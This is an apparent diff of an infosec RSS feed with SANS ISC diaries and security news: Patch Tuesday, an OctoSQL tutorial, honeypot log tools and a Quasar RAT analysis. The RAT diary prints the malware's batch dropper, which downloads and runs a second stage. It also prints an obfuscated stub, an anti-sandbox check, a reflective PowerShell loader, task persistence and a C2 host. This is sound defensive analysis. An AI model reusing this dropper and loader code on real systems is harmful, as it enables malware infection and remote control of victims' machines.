+Using this tool to analyze the data in a short amount of time, the analyst will be able to inquire more information about the IP from websites like Virustotal, IPQualityScore, APIVoid, and etc. That information might give additional data points to see if further investigation is warranted or not.In Conclusion, my script(s) or python tool(s) can assist help detect potential attackers that are targeting their DShield Honeypot. The tools can assist in forensic analysis by tracking IP behavior, login attempts, suspicious files, and other types of data. Additionally, they can provide insights into common attack patterns and methods that could be used by malicious actors. Moreover, other students or individuals can benefit from using these tools for their analysis and attack observations. This is only the starting point for these tools, massive improvements can be made to make them even more effective and useful. In the short term, though, these tools significantly assisted in my analysis projects during this internship. I have attached the links to my GitHub for both tools below.[1] https://isc.sans.edu/diary/31906
+[2] https://github.com/JJWCons/log-scripts/blob/main/logfile_investigation.py (Tool 1 Code)
+[3] https://github.com/JJWCons/log-scripts/blob/main/single_multi_IP.py (Tool 2 Code)
+[4] https://www.sans.edu/cyber-security-programs/bachelors-degree/
 
  
- (c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.]]></content:encoded></item><item><title>Meet the Cybersecurity Defender of 2025 for EMEA</title><link>https://blogs.cisco.com/security/meet-the-cybersecurity-defender-of-2025-for-emea/</link><author>Cristina Errico</author><category>infosec</category><pubDate>Mon, 17 Feb 2025 08:30:00 +0000</pubDate><source url="https://blogs.cisco.com/security">Cisco Security Blog</source><content:encoded><![CDATA[Cisco's 2025 EMEA Cybersecurity Defender of the Year award goes to the team at SAP Enterprise Cloud Services, who raised the bar for overall security posture.]]></content:encoded></item><item><title>ISC Stormcast For Monday, February 17th, 2025 https://isc.sans.edu/podcastdetail/9326, (Mon, Feb 17th)</title><link>https://isc.sans.edu/diary/rss/31690</link><author></author><category>infosec</category><pubDate>Mon, 17 Feb 2025 01:22:04 +0000</pubDate><source url="https://isc.sans.edu/">Sans Edu Diaries</source><content:encoded><![CDATA[
+ (c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.]]></content:encoded></item><item><title>ISC Stormcast For Thursday, June 12th, 2025 https://isc.sans.edu/podcastdetail/9490, (Thu, Jun 12th)</title><link>https://isc.sans.edu/diary/rss/32040</link><author></author><category>infosec</category><pubDate>Thu, 12 Jun 2025 02:00:02 +0000</pubDate><source url="https://isc.sans.edu/">Sans Edu Diaries</source><content:encoded><![CDATA[
+ 
+ (c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.]]></content:encoded></item><item><title>Quasar RAT Delivered Through Bat Files, (Wed, Jun 11th)</title><link>https://isc.sans.edu/diary/rss/32036</link><author></author><category>infosec</category><pubDate>Wed, 11 Jun 2025 05:53:08 +0000</pubDate><source url="https://isc.sans.edu/">Sans Edu Diaries</source><content:encoded><![CDATA[RAT's are popular malware. They are many of them in the wild, Quasar[1] being one of them. The malware has been active for a long time and new campaigns come regularly back on stage. I spotted an interesting .bat file (Windows script) that attracted my attention because it is very well obfuscated. This file is a second stage that is downloaded and launched from a simple script:@echo off
+set "DOCX_PATH=%dp0Game_Purchase_Agreement (1).docx"
+set "BAT_URL=hxxps://store3[.]gofile[.]io/download/web/60e1cbe3-5bcb-4ce5-9807-096b7ef2152c/stub.bat"
+set "STUB_BAT=%dp0stub.bat"
+start "" "%DOCX_PATH%"
+powershell -noprofile -windowstyle hidden -command "Invoke-WebRequest -Uri '%BAT_URL%' -OutFile '%STUB_BAT%'"
+start "" /B "%STUB_BAT%"A decoy Office document is opened to make the victim confident. Let's have a look at the stub[.]bat file, the one obfuscated.The file has a "nice" VT score (1/61) (SHA256:06463c161db81b0714be03cd33431730a5fa56e0019901b03ec61943e08f8e9f[1])Many environment variables are used and "goto" are implemented to forward and back in the document and reconstruct the code:%ywbR5EU0%got%psT9UHn%o%ck4mP% :cFjGe
+
+:: merit cause glow side across trick humble man aunt man
+:KVwlg
+%wn70F%s%xrXwJ%et%zLQjCV% "BFT0e7D9=;$OM1Hj" && %NV38nVKJ%set%tlIujlLR% "wGIv=ey = "&&%mAyrqy%set "wxzXFAyU=Fu.GetT"
+%MqHr7m%s%dOBZ%e%ARwzE%t%SN8O3x1% "BjosEB=.Tripl"
+s%CVz5%e%PLqV%t "Ie9m=ray();$"
+%y5ysfL1C%se%UnikunR6%t%k44zaPJk% "C209=ilter P" &&%psM62h7K%s%lTgUuB%e%oGydvBuB%t%hOBl% "sRJXLMHX=r');$"&& %KNhC9wR%se%DID28qi%t%AgqDi% "DYcN9B=e[]]@(" && s%ENstJM%e%IRLW%t%A6NRgyd% "k3mI=s8 $OM1" &&%mG1f%se%DWxnLG%t%Oaiu% "YZrsX=rovide" && set "NmTYyNq2=Invo"
+g%yQH7u6H%oto :bPY4
+
+:: reject purity renew better trick
+:iaryMFz
+s%dEnHV9%e%KlnkeRpX%t%CTZS% "INBx=9dihP4hL+W2iB2H0u+lsbZDuvimWfacpQlS1QtvFkz3HJHmQ/+fRyQmOGIySz8noyZRUvv8N2AANhsHyXPLu7v9C0UUWeVPeCrfxZ6fgO1tiA+snvgjBybIc4dLxLLLuKGBUFC/5s2769pZpG1f3Z5ESc78Mgu6r7vlTDR1jw1Ij7J3v1qbePCzXtVOTTZi4W27TCpmLlOdDxgTOX3S+28cdUjQd5Q/PwGHesVj8KmCF8fBs1gGjLBUuINaJZuw2mIMWUjGYIbi7offuFiGATIbI9W2g1ngygxsUdOgxAdA3abf0P9L/M/uLCqWCpIl5U+Obj4u8E2ZvM8eICTZqsALHLz5DFGUl7U/L4cGZRbVWQBwv63bKltQv3q3ma296OsEzTltU5e3TEmGgzq3qPtahJQtYmWr4KTs8CUVdjNUDmfgkSO/NsnDtcE1KhO4ufE0sqnQbJ/WqXgvPEgyWB5/KBV3Rm8IS3/9vflXACiW3Po5tpXRLrToKzHQd8O7glrGljxmKMjuROsHCIrrAPbU5HgyH7vakWyhkqYRwCTw1xic91VIlSwjhFBC0PK6OViBiExWp8xa3KmLda2Gc/mprS3n8xo7xBgQplNRyd24yTNMPjcJExj3te3mXma5UUHMBgCL8BtwS4y9J6nRJ+pN2t1U/MCPWhqkuODuc/ND8SuJ8b2g2BVvLv+30nNEmNgvIaM5CHM05G3P9uoB4XZl1sOVKREa/AqbpdjUBkqFhOJcRVqw/3fdG+pai+MGXYpcpQF0HjNkB69FHPksUn91MneNXnPPx1+VfJ6tCJtrRlrA47yXXInkIdCK4JEsuSKLU8n6Lky1FJ7R7GYRrCqaka0uINE5/0DYjD1MNQLswQmap1B1HhSm+X3m7eh2ZLGFOYwX3oKunKeCXk1tFRVbXoKSHkZgxt5nmlNwxQRVXIyzv1Feu85gIWkiMxihIczvfCrFRMJPDW80JSZWpKs1y/iZlja9AWqoE7pjs6buf7hEhN8d/UJmQcVB20AuvQh+RqGRUD3y4YzFEdTSPMSsC9DaQoZZkL/PVFn8qThe script will rebuild code to launch two Powershell instances. The first one is a simple anti-sandbox detection:powershell.exe -ep bypass -w hidden -command $bKOPdCKMepGCO5Y9Yf=(Get-Disk).FriendlyName;if ($bKOPdCKMepGCO5Y9Yf -like '*DADY'+' HARD'+'DIS'+'K*' -or $bKOPdCKMepGCO5Y9Yf -like '*QEMU '+'HARDDI'+'SK*') {taskkill /f /im cmd.exe}It's the first time I see this pretty efficient technique. It will check the system disk type and if it is labelled "DADYHARDDISK" or "QEMU HARDDISK", it will kill itself. That was the case in my sandbox, to I had to patch the script :-)PS C:\Users\REM>(Get-Disk).FriendlyName
+QEMU HARDDISKThe second Powershell is the core infection path. It will download a PNG image that contains the payload to inject into a process. The image is fetched from: hxxps://i[.]ibb[.]co/NdvrqCDQ/j1bz[.]png.The Powershell code is also obfuscated and relies on environment variables defined in the original Bat file!powershell.exe -ep bypass -w hidden -command $cVql = [System.Convert]::FromBase64String(($env:vFSz6.Split('.')|ForEach-Object{(Get-Item ('Env:'+$_)).Value})-join'');$yqt3Czji = [Type]::GetType('System.Security.Cryptography.TripleDESCryptoServiceProvider')::new();$yqt3Czji.Key = [byte[]]@(30,81,30,197,159,52,214,36,169,151,167,116,102,113,244,65);$yqt3Czji.Mode = 'ECB';$yqt3Czji.Padding = 'PKCS7';$yRCM = $yqt3Czji.CreateDecryptor().TransformFinalBlock($cVql,0,$cVql.Length);$XfQ7 = New-Object ('System'+'.IO'+'.Me'+'morySt'+'ream') -ArgumentList (,$yRCM);$nlt6O = New-Object ('Syste'+'m.IO'+'.Me'+'morySt'+'rea'+'m');$tej8sBLE = New-Object ('Syst'+'em.IO.'+'Compre'+'ssio'+'n.G'+'ZipSt'+'rea'+'m') -ArgumentList ($XfQ7, [IO.Compression.CompressionMode]('Decompress'));$tej8sBLE.CopyTo($nlt6O);$UWoQx = $nlt6O.ToArray();$uGjPve = New-Object ('Sys'+'tem'+'.Secu'+'rity'+'.Cry'+'ptogra'+'phy.'+'SHA256'+'Crypt'+'oSer'+'viceP'+'rovid'+'er');$s86s8 = $uGjPve.ComputeHash($UWoQx);$OM1Hjgf = [byte[]]@(26,203,98,66,123,85,187,210,99,96,236,147,173,234,222,190,107,34,223,203,242,234,205,211,250,22,173,56,84,163,184,31);if (-Not (Compare-Object $s86s8 $OM1Hjgf)) {$dfGJB = (Get-CimInstance ('Win32_'+'Pro'+'cess') -Filter ProcessId=$pid).CommandLine;foreach ($EsLaimFu in [AppDomain]::CurrentDomain.GetAssemblies()){if ($EsLaimFu.GlobalAssemblyCache -And $EsLaimFu.Location.Contains('mscorl'+'ib.dll')){foreach ($pMdg2Ay in $EsLaimFu.GetType('Syste'+'m.Refl'+'ect'+'ion.As'+'sembly').GetMethods('Pub'+'lic,St'+'atic')){if ($pMdg2Ay.ToString()[38] -eq ')') {$pMdg2Ay.Invoke($null, (,$UWoQx)).EntryPoint.Invoke($null, (,[string[]](,$dfGJB)))}}}}}You can read interesting strings like "GetAssemblies", "SystemReflectionAssembly" or "Invoke" that are used to perform code injection.Persistenace is implemented throught a scheduled task:schtasks /create /xml 4TCqY.xml /tn f4a22537-7897-4a26-90de-51508f11b41dThe C2 server is JamieRose-42682[.]portmap[.]io.Xavier Mertens (@xme)
+Xameco
+Senior ISC Handler - Freelance Cyber Security ConsultantPGP Key
+
+ 
+ (c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.]]></content:encoded></item><item><title>Risky Business #795 -- How The Com is hacking Salesforce tenants</title><link>https://risky.biz/RB795/</link><author></author><category>infosec</category><category>podcast</category><enclosure url="https://dts.podtrac.com/redirect.mp3/media3.risky.biz/RB795.mp3" length="" type=""/><pubDate>Wed, 11 Jun 2025 04:57:30 +0000</pubDate><source url="https://risky.biz/">Risky Business blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>ISC Stormcast For Wednesday, June 11th, 2025 https://isc.sans.edu/podcastdetail/9488, (Wed, Jun 11th)</title><link>https://isc.sans.edu/diary/rss/32034</link><author></author><category>infosec</category><pubDate>Wed, 11 Jun 2025 02:00:02 +0000</pubDate><source url="https://isc.sans.edu/">Sans Edu Diaries</source><content:encoded><![CDATA[
+ 
+ (c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.]]></content:encoded></item><item><title>Patch Tuesday, June 2025 Edition</title><link>https://krebsonsecurity.com/2025/06/patch-tuesday-june-2025-edition/</link><author>BrianKrebs</author><category>infosec</category><pubDate>Wed, 11 Jun 2025 00:10:53 +0000</pubDate><source url="https://krebsonsecurity.com/">Krebs on Security</source><content:encoded><![CDATA[ today released security updates to fix at least 67 vulnerabilities in its  operating systems and software. Redmond warns that one of the flaws is already under active attack, and that software blueprints showing how to exploit a pervasive Windows bug patched this month are now public.The sole zero-day flaw this month is CVE-2025-33053, a remote code execution flaw in the Windows implementation of  — an HTTP extension that lets users remotely manage files and directories on a server. While WebDAV isn’t enabled by default in Windows, its presence in legacy or specialized systems still makes it a relevant target, said , senior security engineer at ., lead software engineer at , said Microsoft’s advisory for CVE-2025-33053 does not mention that the Windows implementation of WebDAV is listed as deprecated since November 2023, which in practical terms means that the WebClient service no longer starts by default.“The advisory also has attack complexity as low, which means that exploitation does not require preparation of the target environment in any way that is beyond the attacker’s control,” Barnett said. “Exploitation relies on the user clicking a malicious link. It’s not clear how an asset would be immediately vulnerable if the service isn’t running, but all versions of Windows receive a patch, including those released since the deprecation of WebClient, like Server 2025 and Windows 11 24H2.”Microsoft warns that an “elevation of privilege” vulnerability in the Windows Server Message Block (SMB) client (CVE-2025-33073) is likely to be exploited, given that proof-of-concept code for this bug is now public. CVE-2025-33073 has a CVSS risk score of 8.8 (out of 10), and exploitation of the flaw leads to the attacker gaining “SYSTEM” level control over a vulnerable PC.“What makes this especially dangerous is that no further user interaction is required after the initial connection—something attackers can often trigger without the user realizing it,” said , co-founder and CEO of . “Given the high privilege level and ease of exploitation, this flaw poses a significant risk to Windows environments. The scope of affected systems is extensive, as SMB is a core Windows protocol used for file and printer sharing and inter-process communication.”Beyond these highlights, 10 of the vulnerabilities fixed this month were rated “critical” by Microsoft, including eight remote code execution flaws.Notably absent from this month’s patch batch is a fix for a newly discovered weakness in  that allows attackers to act with the privileges of any user in Active Directory. The bug, dubbed “,” was publicly disclosed by researchers at  on May 21, and several public proof-of-concepts are now available. Tenable’s Satnam Narang said organizations that have at least one Windows Server 2025 domain controller should review permissions for principals and limit those permissions as much as possible. has released updates for  and six other products addressing at least 259 vulnerabilities, most of them in an update for .  and  both recently released security updates that require a restart of the browser to take effect. The latest Chrome update fixes two zero-day exploits in the browser (CVE-2025-5419 and CVE-2025-4664).For a detailed breakdown on the individual security updates released by Microsoft today, check out the Patch Tuesday roundup from the SANS Internet Storm Center. Action 1 has a breakdown of patches from Microsoft and a raft of other software vendors releasing fixes this month. As always, please back up your system and/or data before patching, and feel free to drop a note in the comments if you run into any problems applying these updates.]]></content:encoded></item><item><title>Microsoft Patch Tuesday June 2025, (Tue, Jun 10th)</title><link>https://isc.sans.edu/diary/rss/32032</link><author></author><category>infosec</category><pubDate>Tue, 10 Jun 2025 17:50:23 +0000</pubDate><source url="https://isc.sans.edu/">Sans Edu Diaries</source><content:encoded><![CDATA[Microsoft today released patches for 67 vulnerabilities. 10 of these vulnerabilities are rated critical. One vulnerability has already been exploited and another vulnerability has been publicly disclosed before today.CVE-2025-33053: WebDAV remote code execution vulnerability. This vulnerability has already been exploited. Microsoft rates it as important. This affects the client part of WebDAV, not the server part. User interaction is required. If an attacker can control the file name and path, they can trick the victim into executing code over the network. This is another issue related to the still supported remnants of Internet Explorer, like the Scripting Engine and MSHTML. You must apply the IE Cumulative Update to patch, even if you no longer use IE.CVE-2025-33073: A Windows SMB client elevation of Privilege Vulnerability. This vulnerability has already been disclosed but Microsoft has not yet observed it being exploited. An attacker exploiting this vulnerability will gain SYSTEM privileges. But Microsoft considers successful exploitation less likely. An attacker would need the victim to connect to a malicious SMB server.%%CVE:2025-32710%%: An unauthenticated remote code execution vulnerability in the remote desktop service. But it requires the exploitation of a race condition. Microsoft believes it is less likely that an exploit will become available.%%CVE:2025-29828%%: Microsoft states that this vulnerability is due to a "missing release of memory after effective lifetime in Windows Cryptographic Services allows an unauthorized attacker to execute code over a network". This vulnerability worries me a bit if this could be used to exploit various TLS services. However, not enough is known to gauge the exploitability. Microsoft considers the attack as "highly complex" and exploitation as less likely.Microsoft Office Remote Code Execution Vulnerability: Four of the critical vulnerabilities apply to Microsoft Office. These are rated critical as they may be exploited via the preview pane, without actually opening the malicious document.Exploitability (old versions).NET and Visual Studio Remote Code Execution VulnerabilityCert CC: CVE-2025-3052 InsydeH2O Secure Boot BypassDHCP Server Service Denial of Service VulnerabilityLocal Security Authority Subsystem Service (LSASS) Denial of Service VulnerabilityMicrosoft AutoUpdate (MAU) Elevation of Privilege VulnerabilityMicrosoft Excel Remote Code Execution VulnerabilityMicrosoft Office Remote Code Execution VulnerabilityMicrosoft Outlook Remote Code Execution VulnerabilityMicrosoft PowerPoint Remote Code Execution VulnerabilityMicrosoft SharePoint Server Remote Code Execution VulnerabilityMicrosoft Word Remote Code Execution VulnerabilityNuance Digital Engagement Platform Spoofing VulnerabilityPower Automate Elevation of Privilege VulnerabilityRemote Desktop Protocol Client Information Disclosure VulnerabilityVisual Studio Remote Code Execution VulnerabilityWeb Distributed Authoring and Versioning (WEBDAV) Remote Code Execution VulnerabilityWin32k Elevation of Privilege VulnerabilityWindows App Control for Business Security Feature Bypass VulnerabilityWindows Common Log File System Driver Elevation of Privilege VulnerabilityWindows DWM Core Library Information Disclosure VulnerabilityWindows Installer Elevation of Privilege VulnerabilityWindows KDC Proxy Service (KPSSVC) Remote Code Execution VulnerabilityWindows Local Security Authority (LSA) Denial of Service VulnerabilityWindows Media Elevation of Privilege VulnerabilityWindows Netlogon Elevation of Privilege VulnerabilityWindows Recovery Driver Elevation of Privilege VulnerabilityWindows Remote Access Connection Manager Elevation of Privilege VulnerabilityWindows Remote Desktop Services Remote Code Execution VulnerabilityWindows Routing and Remote Access Service (RRAS) Remote Code Execution VulnerabilityWindows SDK Elevation of Privilege VulnerabilityWindows SMB Client Elevation of Privilege VulnerabilityWindows Schannel Remote Code Execution VulnerabilityWindows Security App Spoofing VulnerabilityWindows Shortcut Files Security Feature Bypass VulnerabilityWindows Standards-Based Storage Management Service Denial of Service VulnerabilityWindows Storage Management Provider Information Disclosure VulnerabilityWindows Storage Port Driver Information Disclosure VulnerabilityWindows Task Scheduler Elevation of Privilege VulnerabilityWindows Virtualization-Based Security (VBS) Information Disclosure Vulnerability
+
+ 
+ (c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.]]></content:encoded></item><item><title>Making Agentic AI Work in the Real World</title><link>https://blogs.cisco.com/security/making-ai-agents-work-in-the-real-world-2/</link><author>Raj Chopra</author><category>infosec</category><pubDate>Tue, 10 Jun 2025 12:55:35 +0000</pubDate><source url="https://blogs.cisco.com/security">Cisco Security Blog</source><content:encoded><![CDATA[Cisco is extending the principles of zero trust to Agentic AI. Cisco's Universal Zero Trust Network architecture gives you the tools you need.]]></content:encoded></item><item><title>Cisco Hybrid Mesh Firewall: Better Enforcement Points, Smarter Segmentation, and Multi-Vendor Policy</title><link>https://blogs.cisco.com/security/cisco-hybrid-mesh-firewall-better-enforcement-points-smarter-segmentation-multi-vendor-policy/</link><author>Rick Miles</author><category>infosec</category><pubDate>Tue, 10 Jun 2025 12:55:01 +0000</pubDate><source url="https://blogs.cisco.com/security">Cisco Security Blog</source><content:encoded><![CDATA[Hybrid Mesh Firewall abilities are expanding, with a new firewall generation, extended segmentation enforcement & multi-vendor policy creation & orchestration.]]></content:encoded></item><item><title>DtSR Episode 657 - Cyber-Security Use-Cases for AI (Part 3)</title><link></link><author></author><category>infosec</category><category>podcast</category><enclosure url="https://dts.podtrac.com/redirect.mp3/www.buzzsprout.com/2153215/episodes/17310160-dtsr-episode-657-cyber-security-use-cases-for-ai-part-3.mp3" length="" type=""/><pubDate>Tue, 10 Jun 2025 04:00:00 +0000</pubDate><source url="https://blogwh1t3rabbit.medium.com/">Down the Security Rabbit Hole Podcast</source></item><item><title>ISC Stormcast For Tuesday, June 10th, 2025 https://isc.sans.edu/podcastdetail/9486, (Tue, Jun 10th)</title><link>https://isc.sans.edu/diary/rss/32030</link><author></author><category>infosec</category><pubDate>Tue, 10 Jun 2025 02:00:02 +0000</pubDate><source url="https://isc.sans.edu/">Sans Edu Diaries</source><content:encoded><![CDATA[
+ 
+ (c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.]]></content:encoded></item><item><title>&amp;#x26;#xa;OctoSQL &amp;#x26; Vulnerability Data, (Sun, Jun 8th)</title><link>https://isc.sans.edu/diary/rss/32026</link><author></author><category>infosec</category><pubDate>Mon, 9 Jun 2025 15:42:03 +0000</pubDate><source url="https://isc.sans.edu/">Sans Edu Diaries</source><content:encoded><![CDATA[As an avid daily reader of TLDR Information Security I benefit twofold. First, I gain interesting insights and recommendations regarding launches and tools, where I first learned about OctoSQL. Second, concerning vulnerability details inevitably land in my inbox on a near daily basis. Aside from my recommendation to join the TLDR InfoSec mailing list, diary readers also benefit twofold as, herein, I share the use of OctoSQL as a fast CLI interface to vulnerability data aggregated via CVE-Vulnerability-Information-Downloader. If ever you’ve wanted to join vulnerability data (CVE, CVSS, EPSS, etc) from disparate data sources and file types, this is the diary for you.The 03 JUN 2025 edition of TLDR InfoSec brought us details on Qualcomm’s three patched zero-day vulnerabilities in its Adreno GPU driver that are being actively exploited in targeted attacks. Per the TLDR InfoSec issue, CVE-2025-21479 and CVE-2025-21480 cause memory corruption through unauthorized GPU command execution while CVE-2025-27038 is a use-after-free vulnerability in Chrome’s graphics rendering. “Google’s Threat Analysis Group (TAG) confirmed these vulnerabilities are under limited, targeted exploitation, and Qualcomm provided patches to device manufacturers in May with urgent deployment recommendations.” There has been a pattern of Qualcomm chipset vulnerabilities being exploited by threat actors, including a previous zero-day used adversially with Cellebrite software to unlock activists’ and journalists’ Android devices.[1]
+While this reference was an effective summary of the issues, it did not contain vulnerabilty stats with which to assess severity and exploitability.
+One of my favorite raw data source aggregators for such details is the CVE-Vulnerability-Information-Downloader. With updated a data and OctoSQL in hand, a few useful SQL queries later, we’ll know everything we need. Yes, you can also search web sources, but you may have production scenarios with limited egress access coupled with the need an for easily extensible full-blown dataflow engine which can be used to add a SQL interface to your own applications.Be sure Docker or the like (Rancher Desktop) are available, and acquire a NVD API key if you don’t already have one. In your preferred data or tools directory:git clone https://github.com/trinitor/CVE-Vulnerability-Information-Downloader.git
+cd CVE-Vulnerability-Information-Downloader
+cp env_example .env
+Edit the .env file and add your NVD API key, then run:docker compose up -d  
+docker exec -it vulnerability-tables-cron bash /opt/scripts/download.sh
+Note that the docker exec download process can take up to twenty minutes to finish. Be patient, don’t panic. ;-)
+This will populate the CVE-Vulnerability-Information-Downloader/data/vulnerability-tables-cron/output directory of your installation CSV and JSON versions of CISA Known Exploited Vulnerabilities (KEV) catalog, CVE, CVSS, and EPSS files. This nicely sets up our situation, albeit arbitrary, where we’d like to query these disparate data file types and join key elements such as known exploitation and EPSS score for specific CVEs.
+Here’s where OctoSQL provides capably. I installed OctoSQL on Ubuntu 25.04 with :brew install cube2222/octosql/octosql
+The OctoSQL binary is available via any path after installing via , it’s my preferred one-shot approach.
+Just  to CVE-Vulnerability-Information-Downloader/data/vulnerability-tables-cron/output and you’re ready to go.
+I first crafted a query to return all the Qualcomm CVEs in CISA’s KEV (CISA_known_exploited.csv) catalog to validate the assertion that there has been a pattern of Qualcomm chipset vulnerabilities being exploited by threat actors.octosql "SELECT vendorProject, product, CVE, dateAdded FROM CISA_known_exploited.csv WHERE vendorProject='Qualcomm'"
+ Qualcomm CVEs in KEV catalogThe assertion is valid, as seen in : Qualcomm vulnerabilities have indeed been victim to active exploitation in the wild.
+What about the three currently referenced CVEs CVE-2025-21480, 21479, and 27038? If already known to be exploited, what is the probability of exploitation per EPSS?A query to join CISA’s KEV (CISA_known_exploited.csv) and FIRST’s EPSS.json follows:octosql "SELECT                        
+    c.CVE,
+    c.vendorProject,
+    c.product,
+    c.vulnerabilityName,
+    c.dateAdded,
+    e.EPSS
+FROM
+    CISA_known_exploited.csv AS c
+INNER JOIN
+    EPSS.json AS e
+ON
+    c.CVE = e.CVE
+WHERE CVE='CVE-2025-21480' OR CVE='CVE-2025-21479' OR CVE='CVE-2025-27038'"
+ KEV & EPSS join for Qualcomm CVEsAs seen in , those are low EPSS scores, indicating a rather low probability of exploitation. What about all the other known exploited Qualcomm CVEs? Here again I join KEV Catalog results with EPSS to answer the question with results produced in descending order by EPSS score.octosql "SELECT                        
+    c.CVE,
+    c.vendorProject,
+    c.product,
+    c.vulnerabilityName,
+    c.dateAdded,
+    e.EPSS
+FROM
+    CISA_known_exploited.csv AS c
+INNER JOIN
+    EPSS.json AS e
+ON
+    c.CVE = e.CVE
+WHERE vendorProject='Qualcomm' ORDER BY EPSS DESC"
+ Qualcomm KEV entries by EPSS rankTurns out the highest scoring Qualcomm CVE is one the current three of interest, CVE-2025-27038, with a score of only 0.16672 as seen in .
+What does it all mean?
+Per Jay Jacobs of Cyentia, EPSS is driven by data and has a strong temporal aspect. It only learns from the exploitation activity it sees (from data partners) and predicts on the vulnerability attributes presented. Those with low EPSS scores on the KEV are more likely to be “Access Vector:Local”, “Confidentiality:None”, require some privileges and/or be without published exploit code. Those with higher EPSS scores tend to have exploit code published, be integrated into pen testing tools and scanners, and/or involve remote command execution/injection. Likelihood of exploitation for these Qualcomm vulns is low due to “Access Vector:Local” above all else.
+One additional excellent feature offered by OctoSQL is the ability to explain query plans. As you build complex queries, and potentially productionize them, explainability will be important. Rerunning our last query with the  flag set yields an informative visualization as seen in . Setting it to 1 produces a query plan without type and schema information, while setting it to 2 includes type and schema. I use 1 here for visual clarity.octosql "SELECT                        
+    c.CVE,
+    c.vendorProject,
+    c.product,
+    c.vulnerabilityName,
+    c.dateAdded,
+    e.EPSS
+FROM
+    CISA_known_exploited.csv AS c
+INNER JOIN
+    EPSS.json AS e
+ON
+    c.CVE = e.CVE
+WHERE vendorProject='Qualcomm' ORDER BY EPSS DESC" --explain 1
+I’ve barely scratched the surface of its potential use cases here, but I’ve incorporated OctoSQL into my personal practice, and truly appreciate the ability to query disparate sources in my terminal. I also appreciate the ability to download vulnerability data use the information for enrichment courtesy of the CVE Vulnerability Information Downloader. Please consider both of these offerings for your on purpose and benefit.
+
+ 
+ (c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.]]></content:encoded></item><item><title>Foundation-sec-8b-reasoning: World’s First Security Reasoning Model</title><link>https://blogs.cisco.com/security/foundation-sec-8b-reasoning-worlds-first-security-reasoning-model/</link><author>Yaron Singer</author><category>infosec</category><pubDate>Mon, 9 Jun 2025 12:00:05 +0000</pubDate><source url="https://blogs.cisco.com/security">Cisco Security Blog</source><content:encoded><![CDATA[Foundation AI's second release—Foundation-sec-8b-reasoning is designed to designed to bring enhanced analytical capabilities to complex security workflows.]]></content:encoded></item><item><title>New Way to Covertly Track Android Users</title><link>https://www.schneier.com/blog/archives/2025/06/new-way-to-track-covertly-android-users.html</link><author>Bruce Schneier</author><category>infosec</category><category>blog</category><pubDate>Mon, 9 Jun 2025 10:54:19 +0000</pubDate><source url="https://www.schneier.com/">Schneider on Security</source><content:encoded><![CDATA[Researchers have discovered a new way to covertly track Android users. Both Meta and Yandex were using it, but have suddenly stopped now that they have been caught.The details are interesting, and worth reading in detail:Tracking code that Meta and Russia-based Yandex embed into millions of websites is de-anonymizing visitors by abusing legitimate Internet protocols, causing Chrome and other browsers to surreptitiously send unique identifiers to native apps installed on a device, researchers have discovered. Google says it’s investigating the abuse, which allows Meta and Yandex to convert ephemeral web identifiers into persistent mobile app user identities.The covert tracking—­implemented in the Meta Pixel and Yandex Metrica trackers­—allows Meta and Yandex to bypass core security and privacy protections provided by both the Android operating system and browsers that run on it. Android sandboxing, for instance, isolates processes to prevent them from interacting with the OS and any other app installed on the device, cutting off access to sensitive data or privileged system resources. Defenses such  partitioning and storage partitioning, which are built into all major browsers, store site cookies and other data associated with a website in containers that are unique to every top-level website domain to ensure they’re off-limits for every other site.]]></content:encoded></item><item><title>ISC Stormcast For Monday, June 9th, 2025 https://isc.sans.edu/podcastdetail/9484, (Mon, Jun 9th)</title><link>https://isc.sans.edu/diary/rss/32028</link><author></author><category>infosec</category><pubDate>Mon, 9 Jun 2025 02:00:03 +0000</pubDate><source url="https://isc.sans.edu/">Sans Edu Diaries</source><content:encoded><![CDATA[
+ 
+ (c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.]]></content:encoded></item><item><title>Extracting With pngdump.py, (Sun, Jun 8th)</title><link>https://isc.sans.edu/diary/rss/32022</link><author></author><category>infosec</category><pubDate>Sun, 8 Jun 2025 05:16:10 +0000</pubDate><source url="https://isc.sans.edu/">Sans Edu Diaries</source><content:encoded><![CDATA[Here is the analysis of the trojanized PNG file Xavier discussed:Notice that this PNG file has 11 "items": 10 valid items (1 header and 9 chunks) and one invalid item: unexpected data after the terminating chunk (IEND).This can easily be selected with -s 11:That's the appended payload:
+
+ 
+ (c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.]]></content:encoded></item><item><title>Wireshark 4.4.7 Released, (Sun, Jun 8th)</title><link>https://isc.sans.edu/diary/rss/32020</link><author></author><category>infosec</category><pubDate>Sun, 8 Jun 2025 05:15:25 +0000</pubDate><source url="https://isc.sans.edu/">Sans Edu Diaries</source><content:encoded><![CDATA[Wireshark release 4.4.7 fixes 1 vulnerability (%%cve:2025-5601%%) and 8 bugs.
+
  
  (c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.]]></content:encoded></item></channel></rss>
